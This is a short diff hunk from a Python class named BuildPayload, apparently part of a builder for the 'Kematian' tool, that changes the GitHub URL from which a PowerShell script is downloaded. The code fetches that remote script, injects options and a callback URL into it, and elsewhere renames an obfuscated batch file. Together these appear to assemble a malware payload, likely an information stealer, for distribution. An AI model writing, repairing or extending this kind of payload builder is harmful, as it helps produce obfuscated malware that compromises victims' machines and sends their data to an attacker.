@@ -134,7 +134,7 @@ class BuildPayload:
             os.rename(f"{working_dir}\\{name}_obf.bat", f"{working_dir}\\{name}.bat")
 
     async def build_ps1(self, url: str, name: str, options: dict[str, bool]) -> None:
-        github_raw_url_ps1 = "https://raw.githubusercontent.com/KematianPirate-Devs/Kematian/main/frontend-src/main.ps1"
+        github_raw_url_ps1 = "https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.ps1"
         content = requests.get(github_raw_url_ps1).text.strip()
 
         content = await self._replace(content, options, url, hashtags=True)
